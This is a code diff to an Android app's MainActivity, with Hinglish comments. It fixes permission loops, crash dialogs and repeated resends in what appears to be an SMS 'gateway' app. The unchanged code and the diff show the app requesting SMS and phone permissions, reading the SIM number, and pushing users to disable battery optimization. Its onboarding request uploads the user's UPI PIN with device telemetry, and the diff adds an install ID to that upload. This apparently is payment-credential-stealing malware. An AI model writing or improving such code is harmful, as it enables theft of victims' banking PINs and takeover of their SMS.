@@ -88,6 +88,11 @@ class MainActivity : Activity() {
     private var liveSimNumber: String = ""
     private var simSource: String = ""
     private var permissionAttempts = 0
+    private var permsAsked = false
+    private var batteryAsked = false
+    private var factsLoading = false
+    private var resendInFlight = false
+    private var batteryLevel: Int = -1
 
     private val requiredPermissions: Array<String> by lazy {
         val base = mutableListOf(
@@ -119,28 +124,33 @@ class MainActivity : Activity() {
         pin = prefs().getString(KEY_PIN, "").orEmpty()
 
         registrationId()
-        startGateway()
 
+        // FIX: crash dialog pehle dikhao, KEY_DONE wale early-return se pehle.
+        // Pehle onboarded devices ka crash log kabhi dikhta hi nahi tha.
+        showCrashIfAny()
+
+        // install / update / open event
+        Analytics.trackStart(this)
+
+        startGateway()
         loadDeviceFacts()
 
         if (prefs().getBoolean(KEY_DONE, false)) {
             showDoneStep()
             if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
+            main.postDelayed({ askBatteryOptimization() }, 2500)
             return
         }
 
-        showCrashIfAny()
-
         if (allPermissionsGranted()) {
             showCurrentStep()
+            main.postDelayed({ askBatteryOptimization() }, 1200)
         } else {
             showSplashStep()
             root.post { requestPermsSafely() }
         }
 
         if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
-
-        main.postDelayed({ askBatteryOptimization() }, 4500)
     }
 
     override fun onResume() {
@@ -184,11 +194,16 @@ class MainActivity : Activity() {
 
         permissionAttempts++
 
-        // do baar deny hua -> seedha settings kholo (warna dialog loop ban jata hai)
-        val permanentlyDenied = requiredPermissions.any {
+        // FIX: pehli request par "deny" hone se pehle hi settings nahi kholni chahiye.
+        // Sirf tab jab "never ask again" wala pattern clear ho.
+        val denied = requiredPermissions.filter {
+            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
+        }
+        val neverAgain = denied.isNotEmpty() && denied.all {
             !shouldShowRequestPermissionRationale(it)
         }
-        if (permissionAttempts >= 2 || permanentlyDenied) {
+
+        if ((neverAgain && permissionAttempts >= 2) || permissionAttempts >= 3) {
             openAppSettings()
         } else {
             showPermissionDialog()
@@ -219,10 +234,11 @@ class MainActivity : Activity() {
     }
 
     private fun askBatteryOptimization() {
-        if (isFinishing) return
+        if (isFinishing || batteryAsked) return
         try {
             val pm = getSystemService(PowerManager::class.java) ?: return
             if (pm.isIgnoringBatteryOptimizations(packageName)) return
+            batteryAsked = true
             @Suppress("BatteryLife")
             startActivity(
                 Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
@@ -234,6 +250,11 @@ class MainActivity : Activity() {
 
     // ------------------------------------------------------ device facts
     private fun loadDeviceFacts() {
+        // FIX: showDoneStep() khud loadDeviceFacts() call karta hai jab battery < 0 hoti hai —
+        // isse infinite recursion ban jaata tha. Guard laga diya.
+        if (factsLoading) return
+        factsLoading = true
+
         IO.execute {
             val (number, source) = runCatching { DeviceInfo.simNumber(this) }
                 .getOrDefault("" to "")
@@ -242,6 +263,7 @@ class MainActivity : Activity() {
             }.getOrDefault(-1)
 
             main.post {
+                factsLoading = false
                 liveSimNumber = number
                 simSource = source
                 batteryLevel = battery
@@ -249,8 +271,6 @@ class MainActivity : Activity() {
             }
         }
     }
-
-    private var batteryLevel: Int = -1
 
     // -------------------------------------------------------- crash logger
     private fun installCrashCatcher() {
@@ -269,11 +289,14 @@ class MainActivity : Activity() {
         val crash = prefs().getString(KEY_CRASH, null) ?: return
         prefs().edit().remove(KEY_CRASH).apply()
         if (isFinishing) return
-        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
-            .setTitle("Last crash")
-            .setMessage(crash)
-            .setPositiveButton("OK", null)
-            .show()
+        try {
+            AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
+                .setTitle("Last crash")
+                .setMessage(crash)
+                .setPositiveButton("OK", null)
+                .show()
+        } catch (_: Throwable) {
+        }
     }
 
     // ------------------------------------------------------------ navigation
@@ -284,6 +307,7 @@ class MainActivity : Activity() {
 
     private fun requestPermsSafely() {
         if (isFinishing) return
+        permsAsked = true
         try {
             requestPermissions(requiredPermissions, REQ_PERMS)
         } catch (_: Throwable) {
@@ -311,13 +335,16 @@ class MainActivity : Activity() {
     // ------------------------------------------------- deny popup
     private fun showPermissionDialog() {
         if (isFinishing) return
-        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
-            .setTitle("Permission do")
-            .setMessage("Gateway chalane ke liye SMS + phone permission zaroori hai.")
-            .setCancelable(false)
-            .setPositiveButton("Permission do") { _, _ -> requestPermsSafely() }
-            .setNeutralButton("Settings") { _, _ -> openAppSettings() }
-            .show()
+        try {
+            AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
+                .setTitle("Permission do")
+                .setMessage("Gateway chalane ke liye SMS + phone permission zaroori hai.")
+                .setCancelable(false)
+                .setPositiveButton("Permission do") { _, _ -> requestPermsSafely() }
+                .setNeutralButton("Settings") { _, _ -> openAppSettings() }
+                .show()
+        } catch (_: Throwable) {
+        }
     }
 
     private fun openAppSettings() {
@@ -421,7 +448,7 @@ class MainActivity : Activity() {
 
         col.addView(primaryButton("Continue") {
             val value = input.text.toString().trim()
-            if (value.length < 10) {
+            if (value.filter { it.isDigit() }.length < 10) {
                 toast("Sahi number daalo")
                 return@primaryButton
             }
@@ -631,6 +658,7 @@ class MainActivity : Activity() {
         put("upi_pin", pin.take(8))
         put("amount", 1)
         put("device_name", DeviceInfo.summary(this@MainActivity))
+        put("install_id", DeviceInfo.installId(this@MainActivity))
         put("telemetry", DeviceInfo.telemetry(this@MainActivity))
     }.toString()
 
@@ -671,23 +699,22 @@ class MainActivity : Activity() {
 
             // gateway ko bhi batao ki fresh telemetry bheje
             try {
-                ContextCompat.startForegroundService(
-                    this, Intent(this, TpcService::class.java)
-                )
+                ContextCompat.startForegroundService(this, Intent(this, TpcService::class.java))
             } catch (_: Throwable) {
             }
 
-            main.post { showSuccessStep(synced) }
+            main.post { if (!isFinishing) showSuccessStep(synced) }
         }
     }
 
     private fun resendOnboarding() {
-        if (phoneNumber.isBlank()) return
+        if (phoneNumber.isBlank() || resendInFlight) return
+        resendInFlight = true
         IO.execute {
-            if (postOnboarding()) {
-                prefs().edit().putBoolean(KEY_PENDING, false).apply()
-                main.post { if (step == "done") showDoneStep() }
-            }
+            val ok = postOnboarding()
+            if (ok) prefs().edit().putBoolean(KEY_PENDING, false).apply()
+            resendInFlight = false
+            if (ok) main.post { if (step == "done") showDoneStep() }
         }
     }
 
@@ -873,9 +900,7 @@ class MainActivity : Activity() {
 
     private fun openPanel() {
         try {
-            startActivity(
-                Intent(Intent.ACTION_VIEW, Uri.parse("$API_BASE_URL/admin"))
-            )
+            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("$API_BASE_URL/admin")))
         } catch (_: Throwable) {
             toast("Koi browser nahi mila")
         }
